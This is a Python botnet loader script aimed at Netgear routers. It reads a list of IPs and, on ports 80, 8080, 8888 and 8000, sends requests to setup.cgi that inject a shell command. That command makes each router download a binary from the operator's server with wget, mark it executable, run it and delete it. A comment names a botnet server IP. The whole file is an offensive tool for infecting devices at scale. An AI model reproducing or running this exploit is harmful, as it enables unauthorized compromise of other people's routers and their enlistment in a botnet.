#usr/bin/python
# Kadens Netgear Loader
# Port 80 or 8080
# Mainly America etc
import threading, sys, time, re, os, requests
if len(sys.argv) < 2:
    print "\033[37mUsage: python "+sys.argv[0]+" list of ips \033[37m"
    sys.exit()

server = "chnage to your server ip" # YOUR BOTNETS IP 185.244.25.166/yeansn
mips = "" # Make sure mips is in no directory
ips = open(sys.argv[1], "r").readlines()
class netgear(threading.Thread):
		def __init__ (self, ip):
			threading.Thread.__init__(self)
			self.ip = str(ip).rstrip('\n')
		def run(self):
			try:
				print("\033[37m[\033[36mNETGEAR\033[37m] Trying \033[36m-> \033[37m%s") % (self.ip)
				payload = "http://" +self.ip +"/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://"+server+"/"+mips+"%20-O%20/var/tmp/"+mips+";%20chmod%20777%20/var/tmp/"+mips+";%20/var/tmp/"+mips+";%20rm%20-rf%20/var/tmp/"+mips+"&curpath=/&currentsetting.htm=1"
				payload1 = "http://" +self.ip +":8080/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://"+server+"/"+mips+"%20-O%20/var/tmp/"+mips+";%20chmod%20777%20/var/tmp/"+mips+";%20/var/tmp/"+mips+";%20rm%20-rf%20/var/tmp/"+mips+"&curpath=/&currentsetting.htm=1" 
				payload2 = "http://" +self.ip +":8888/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://"+server+"/"+mips+"%20-O%20/var/tmp/"+mips+";%20chmod%20777%20/var/tmp/"+mips+";%20/var/tmp/"+mips+";%20rm%20-rf%20/var/tmp/"+mips+"&curpath=/&currentsetting.htm=1" 
				payload3 = "http://" +self.ip +":8000/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget%20http://"+server+"/"+mips+"%20-O%20/var/tmp/"+mips+";%20chmod%20777%20/var/tmp/"+mips+";%20/var/tmp/"+mips+";%20rm%20-rf%20/var/tmp/"+mips+"&curpath=/&currentsetting.htm=1" 
				requests.get(payload, timeout=5)
				requests.get(payload1, timeout=5)
				requests.get(payload2, timeout=5)
				requests.get(payload3, timeout=5)
        		except:
            		    pass
 
for ip in ips:
	try:
		kaden = netgear(ip)
		kaden.start()
	except:
		pass
